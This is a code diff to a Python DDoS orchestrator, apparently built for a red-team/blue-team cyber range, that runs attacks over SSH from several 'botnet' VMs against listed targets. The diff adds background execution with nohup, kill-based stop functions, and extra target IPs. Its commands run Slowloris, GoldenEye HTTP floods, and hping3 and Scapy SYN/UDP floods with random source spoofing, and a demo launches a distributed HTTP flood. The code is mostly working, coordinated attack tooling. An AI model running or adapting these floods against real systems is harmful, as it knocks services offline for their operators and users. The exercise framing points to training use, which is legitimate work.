@@ -46,7 +46,7 @@ class AttackResult:
     tool: str
     start_time: str
     end_time: Optional[str]
-    status: str  # running, completed, failed
+    status: str  # running, completed, failed, stopped
     packets_sent: int
     bytes_sent: int
     stdout: str
@@ -54,6 +54,7 @@ class AttackResult:
     exit_code: Optional[int]
     captured_pcap: Optional[str] = None
     captured_netstat_log: Optional[str] = None
+    process_name: Optional[str] = None  # For tracking the process to kill
 
 class SSHExecutor:
     """Execute commands on remote VMs via SSH"""
@@ -196,9 +197,12 @@ class DDoSOrchestrator:
             "botnet2": "10.72.200.65",
         }
         self.blue_team_targets = {
-            "team1": "10.72.200.51",
-            "team2": "10.72.200.54",
-            "team3": "10.72.200.57",
+            "team1": "10.72.200.54",  # Blue Team with Wazuh Agent (Primary Target)
+            "team2": "10.72.200.51",  # Additional Blue Team server (if exists)
+            "team3": "10.72.200.57",  # Additional Blue Team server (if exists)
+            "target_11": "192.168.50.11",
+            "target_16": "192.168.50.16",
+            "target_81": "192.168.50.81",
         }
 
     def install_ddos_tools(self, vm_ip: str) -> Dict[str, Any]:
@@ -375,175 +379,303 @@ EOF
 
     def execute_slowloris(self, attacker_vm: str, target_ip: str,
                           port: int = 80, sockets: int = 200,
-                          duration: int = 300) -> str:
+                          duration: int = 300, background: bool = False) -> str:
         """
         Execute Slowloris attack (Slow HTTP)
         """
         attack_id = str(uuid.uuid4())
 
-        command = f"""
-        timeout {duration} slowloris -s {sockets} -p {port} {target_ip} 2>&1 | \
-        tee /tmp/slowloris_{attack_id}.log
-        """
+        if background:
+            # Run in background and return immediately
+            command = f"""
+            nohup timeout {duration} slowloris -s {sockets} -p {port} {target_ip} \
+            > /tmp/slowloris_{attack_id}.log 2>&1 &
+            """
+            logger.info(f"🐌 Launching Slowloris (background): {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)
 
-        logger.info(f"🐌 Launching Slowloris: {attacker_vm} → {target_ip}:{port}")
-        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="slowloris",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="slowloris"
+            )
+        else:
+            # Run synchronously
+            command = f"""
+            timeout {duration} slowloris -s {sockets} -p {port} {target_ip} 2>&1 | \
+            tee /tmp/slowloris_{attack_id}.log
+            """
+            logger.info(f"🐌 Launching Slowloris: {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
 
-        attack_result = AttackResult(
-            attack_id=attack_id,
-            attacker_vm=attacker_vm,
-            target_ip=target_ip,
-            target_port=port,
-            tool="slowloris",
-            start_time=datetime.now().isoformat(),
-            end_time=datetime.now().isoformat() if result["success"] else None,
-            status="completed" if result["success"] else "failed",
-            packets_sent=0,  # Slowloris uses few packets
-            bytes_sent=0,
-            stdout=result["stdout"],
-            stderr=result["stderr"],
-            exit_code=result["exit_code"]
-        )
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="slowloris",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=0,  # Slowloris uses few packets
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="slowloris"
+            )
 
         self.active_attacks[attack_id] = attack_result
         return attack_id
 
     def execute_http_flood(self, attacker_vm: str, target_ip: str,
                            port: int = 80, workers: int = 50,
-                           sockets: int = 100, duration: int = 300) -> str:
+                           sockets: int = 100, duration: int = 300, background: bool = False) -> str:
         """
         Execute HTTP flood using GoldenEye
         """
         attack_id = str(uuid.uuid4())
 
-        command = f"""
-        cd /opt/GoldenEye
-        timeout {duration} python3 goldeneye.py http://{target_ip}:{port} \
-        -w {workers} -s {sockets} 2>&1 | tee /tmp/goldeneye_{attack_id}.log
-        """
+        if background:
+            command = f"""
+            nohup timeout {duration} python3 /opt/GoldenEye/goldeneye.py http://{target_ip}:{port} \
+            -w {workers} -s {sockets} > /tmp/goldeneye_{attack_id}.log 2>&1 &
+            """
+            logger.info(f"💥 Launching HTTP Flood (GoldenEye - background): {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)
 
-        logger.info(f"💥 Launching HTTP Flood (GoldenEye): {attacker_vm} → {target_ip}:{port}")
-        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="goldeneye",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="python3.*goldeneye"
+            )
+        else:
+            command = f"""
+            cd /opt/GoldenEye
+            timeout {duration} python3 goldeneye.py http://{target_ip}:{port} \
+            -w {workers} -s {sockets} 2>&1 | tee /tmp/goldeneye_{attack_id}.log
+            """
+            logger.info(f"💥 Launching HTTP Flood (GoldenEye): {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
 
-        attack_result = AttackResult(
-            attack_id=attack_id,
-            attacker_vm=attacker_vm,
-            target_ip=target_ip,
-            target_port=port,
-            tool="goldeneye",
-            start_time=datetime.now().isoformat(),
-            end_time=datetime.now().isoformat() if result["success"] else None,
-            status="completed" if result["success"] else "failed",
-            packets_sent=workers * sockets * 100,  # Estimate
-            bytes_sent=0,
-            stdout=result["stdout"],
-            stderr=result["stderr"],
-            exit_code=result["exit_code"]
-        )
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="goldeneye",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=workers * sockets * 100,  # Estimate
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="python3.*goldeneye"
+            )
 
         self.active_attacks[attack_id] = attack_result
         return attack_id
 
     def execute_syn_flood(self, attacker_vm: str, target_ip: str,
-                         port: int = 80, duration: int = 300) -> str:
+                         port: int = 80, duration: int = 300, background: bool = False) -> str:
         """
         Execute SYN flood using hping3
         """
         attack_id = str(uuid.uuid4())
 
-        command = f"""
-        sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target_ip} \
-        2>&1 | tee /tmp/synflood_{attack_id}.log
-        """
+        if background:
+            command = f"""
+            nohup sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target_ip} \
+            > /tmp/synflood_{attack_id}.log 2>&1 &
+            """
+            logger.info(f"🌊 Launching SYN Flood (background): {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)
 
-        logger.info(f"🌊 Launching SYN Flood: {attacker_vm} → {target_ip}:{port}")
-        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="hping3_syn",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="hping3"
+            )
+        else:
+            command = f"""
+            sudo timeout {duration} hping3 -S -p {port} --flood --rand-source {target_ip} \
+            2>&1 | tee /tmp/synflood_{attack_id}.log
+            """
+            logger.info(f"🌊 Launching SYN Flood: {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
 
-        attack_result = AttackResult(
-            attack_id=attack_id,
-            attacker_vm=attacker_vm,
-            target_ip=target_ip,
-            target_port=port,
-            tool="hping3_syn",
-            start_time=datetime.now().isoformat(),
-            end_time=datetime.now().isoformat() if result["success"] else None,
-            status="completed" if result["success"] else "failed",
-            packets_sent=100000,  # Estimate for flood
-            bytes_sent=0,
-            stdout=result["stdout"],
-            stderr=result["stderr"],
-            exit_code=result["exit_code"]
-        )
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="hping3_syn",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=100000,  # Estimate for flood
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="hping3"
+            )
 
         self.active_attacks[attack_id] = attack_result
         return attack_id
 
     def execute_udp_flood(self, attacker_vm: str, target_ip: str,
-                         port: int = 53, duration: int = 300) -> str:
+                         port: int = 53, duration: int = 300, background: bool = False) -> str:
         """
         Execute UDP flood using hping3
         """
         attack_id = str(uuid.uuid4())
 
-        command = f"""
-        sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target_ip} \
-        2>&1 | tee /tmp/udpflood_{attack_id}.log
-        """
+        if background:
+            command = f"""
+            nohup sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target_ip} \
+            > /tmp/udpflood_{attack_id}.log 2>&1 &
+            """
+            logger.info(f"🌪️ Launching UDP Flood (background): {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)
 
-        logger.info(f"🌪️ Launching UDP Flood: {attacker_vm} → {target_ip}:{port}")
-        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="hping3_udp",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="hping3"
+            )
+        else:
+            command = f"""
+            sudo timeout {duration} hping3 --udp -p {port} --flood --rand-source {target_ip} \
+            2>&1 | tee /tmp/udpflood_{attack_id}.log
+            """
+            logger.info(f"🌪️ Launching UDP Flood: {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
 
-        attack_result = AttackResult(
-            attack_id=attack_id,
-            attacker_vm=attacker_vm,
-            target_ip=target_ip,
-            target_port=port,
-            tool="hping3_udp",
-            start_time=datetime.now().isoformat(),
-            end_time=datetime.now().isoformat() if result["success"] else None,
-            status="completed" if result["success"] else "failed",
-            packets_sent=100000,  # Estimate
-            bytes_sent=0,
-            stdout=result["stdout"],
-            stderr=result["stderr"],
-            exit_code=result["exit_code"]
-        )
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool="hping3_udp",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=100000,  # Estimate
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="hping3"
+            )
 
         self.active_attacks[attack_id] = attack_result
         return attack_id
 
     def execute_scapy_flood(self, attacker_vm: str, target_ip: str,
                            port: int = 80, attack_type: str = "syn",
-                           duration: int = 300) -> str:
+                           duration: int = 300, background: bool = False) -> str:
         """
         Execute Scapy-based flood with IP spoofing
         """
         attack_id = str(uuid.uuid4())
 
-        command = f"""
-        sudo timeout {duration} python3 /opt/scapy_ddos.py \
-        --target {target_ip} --port {port} --type {attack_type} --duration {duration} \
-        2>&1 | tee /tmp/scapy_{attack_type}_{attack_id}.log
-        """
+        if background:
+            command = f"""
+            nohup sudo timeout {duration} python3 /opt/scapy_ddos.py \
+            --target {target_ip} --port {port} --type {attack_type} --duration {duration} \
+            > /tmp/scapy_{attack_type}_{attack_id}.log 2>&1 &
+            """
+            logger.info(f"🌊 Launching Scapy {attack_type.upper()} Flood (background): {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=10)
 
-        logger.info(f"🌊 Launching Scapy {attack_type.upper()} Flood: {attacker_vm} → {target_ip}:{port}")
-        result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool=f"scapy_{attack_type}",
+                start_time=datetime.now().isoformat(),
+                end_time=None,
+                status="running",
+                packets_sent=0,
+                bytes_sent=0,
+                stdout="",
+                stderr="",
+                exit_code=None,
+                process_name="python3.*scapy_ddos"
+            )
+        else:
+            command = f"""
+            sudo timeout {duration} python3 /opt/scapy_ddos.py \
+            --target {target_ip} --port {port} --type {attack_type} --duration {duration} \
+            2>&1 | tee /tmp/scapy_{attack_type}_{attack_id}.log
+            """
+            logger.info(f"🌊 Launching Scapy {attack_type.upper()} Flood: {attacker_vm} → {target_ip}:{port}")
+            result = SSHExecutor.execute_command(attacker_vm, command, timeout=duration + 30)
 
-        attack_result = AttackResult(
-            attack_id=attack_id,
-            attacker_vm=attacker_vm,
-            target_ip=target_ip,
-            target_port=port,
-            tool=f"scapy_{attack_type}",
-            start_time=datetime.now().isoformat(),
-            end_time=datetime.now().isoformat() if result["success"] else None,
-            status="completed" if result["success"] else "failed",
-            packets_sent=0,  # Difficult to estimate without parsing logs
-            bytes_sent=0,
-            stdout=result["stdout"],
-            stderr=result["stderr"],
-            exit_code=result["exit_code"]
-        )
+            attack_result = AttackResult(
+                attack_id=attack_id,
+                attacker_vm=attacker_vm,
+                target_ip=target_ip,
+                target_port=port,
+                tool=f"scapy_{attack_type}",
+                start_time=datetime.now().isoformat(),
+                end_time=datetime.now().isoformat() if result["success"] else None,
+                status="completed" if result["success"] else "failed",
+                packets_sent=0,  # Difficult to estimate without parsing logs
+                bytes_sent=0,
+                stdout=result["stdout"],
+                stderr=result["stderr"],
+                exit_code=result["exit_code"],
+                process_name="python3.*scapy_ddos"
+            )
 
         self.active_attacks[attack_id] = attack_result
         return attack_id
@@ -611,6 +743,7 @@ EOF
         duration: int = 300,
         num_attackers: int = 3,
         capture_on_target: bool = True,
+        background: bool = True,  # New parameter: run attacks in background by default
     ) -> List[str]:
         """
         Execute coordinated attack from multiple VMs
@@ -659,21 +792,21 @@ EOF
             try:
                 if attack_type == "http_flood":
                     attack_id = self.execute_http_flood(attacker_ip, target_ip,
-                                                       port=target_port, duration=duration)
+                                                       port=target_port, duration=duration, background=background)
                 elif attack_type == "syn_flood":
                     attack_id = self.execute_syn_flood(attacker_ip, target_ip,
-                                                      port=target_port, duration=duration)
+                                                      port=target_port, duration=duration, background=background)
                 elif attack_type == "udp_flood":
                     attack_id = self.execute_udp_flood(attacker_ip, target_ip,
-                                                      port=target_port, duration=duration)
+                                                      port=target_port, duration=duration, background=background)
                 elif attack_type == "slowloris":
                     attack_id = self.execute_slowloris(attacker_ip, target_ip,
-                                                      port=target_port, duration=duration)
+                                                      port=target_port, duration=duration, background=background)
                 elif attack_type in ["scapy_syn", "scapy_udp", "scapy_icmp"]:
                     # Extract type from string (e.g., "scapy_syn" -> "syn")
                     scapy_type = attack_type.split("_")[1]
                     attack_id = self.execute_scapy_flood(
-                        attacker_ip, target_ip, port=target_port, attack_type=scapy_type, duration=duration
+                        attacker_ip, target_ip, port=target_port, attack_type=scapy_type, duration=duration, background=background
                     )
                 else:
                     logger.error(f"❌ Unknown attack type: {attack_type}")
@@ -722,6 +855,51 @@ EOF
         if attack:
             return asdict(attack)
         return None
+
+    def stop_attack(self, attack_id: str) -> bool:
+        """
+        Stop a running attack by killing the process on the remote VM
+        """
+        attack = self.active_attacks.get(attack_id)
+        if not attack:
+            logger.error(f"❌ Attack {attack_id} not found")
+            return False
+
+        if attack.status in ["completed", "failed", "stopped"]:
+            logger.warning(f"⚠️ Attack {attack_id} already {attack.status}")
+            return False
+
+        logger.info(f"🛑 Stopping attack {attack_id} on {attack.attacker_vm}...")
+
+        # Kill the process by name
+        if attack.process_name:
+            kill_command = f"sudo pkill -9 -f '{attack.process_name}'"
+            result = SSHExecutor.execute_command(attack.attacker_vm, kill_command, timeout=10)
+
+            if result["success"] or result["exit_code"] == 1:  # pkill returns 1 if no process found
+                attack.status = "stopped"
+                attack.end_time = datetime.now().isoformat()
+                logger.info(f"✅ Attack {attack_id} stopped successfully")
+                return True
+            else:
+                logger.error(f"❌ Failed to stop attack {attack_id}: {result['stderr']}")
+                return False
+        else:
+            logger.error(f"❌ No process name tracked for attack {attack_id}")
+            return False
+
+    def stop_all_attacks(self) -> Dict[str, bool]:
+        """
+        Stop all running attacks
+        """
+        logger.info("🛑 Stopping all active attacks...")
+        results = {}
+
+        for attack_id, attack in self.active_attacks.items():
+            if attack.status == "running":
+                results[attack_id] = self.stop_attack(attack_id)
+
+        return results
 
     def ensure_tcpdump_on_host(self, hostname: str) -> bool:
         """
@@ -773,18 +951,28 @@ if __name__ == "__main__":
         attack_type="http_flood",
         target_team="team1",
         target_port=9080,  # DVWA port
-        duration=60,  # 1 minute test
-        num_attackers=2  # Use 2 attackers
-        , capture_on_target=True
+        duration=300,  # 5 minutes - but we can stop it early
+        num_attackers=2,  # Use 2 attackers
+        capture_on_target=True,
+        background=True  # Run in background so we can stop it
     )
 
     print(f"\n✅ Launched {len(attack_ids)} distributed attacks")
     for attack_id in attack_ids:
         print(f"   - Attack ID: {attack_id}")
 
-    # Wait for attacks to complete
-    print("\n⏳ Waiting for attacks to complete...")
-    time.sleep(70)
+    # Let attacks run for a bit
+    print("\n⏳ Attacks running... (will stop after 30 seconds for demo)")
+    time.sleep(30)
+
+    # Stop all attacks
+    print("\n🛑 Stopping all attacks...")
+    stop_results = orchestrator.stop_all_attacks()
+    for attack_id, success in stop_results.items():
+        if success:
+            print(f"   ✅ Stopped attack {attack_id}")
+        else:
+            print(f"   ❌ Failed to stop attack {attack_id}")
 
     # Check attack status
     print("\n=== Attack Results ===")
@@ -795,7 +983,8 @@ if __name__ == "__main__":
             print(f"   Tool: {status['tool']}")
             print(f"   Target: {status['target_ip']}:{status['target_port']}")
             print(f"   Status: {status['status']}")
-            print(f"   Exit Code: {status['exit_code']}")
+            print(f"   Started: {status['start_time']}")
+            print(f"   Ended: {status['end_time']}")
             # Show capture artifacts if available
             if status.get('captured_pcap'):
                 print(f"   Captured PCAP (local): {status.get('captured_pcap')}")
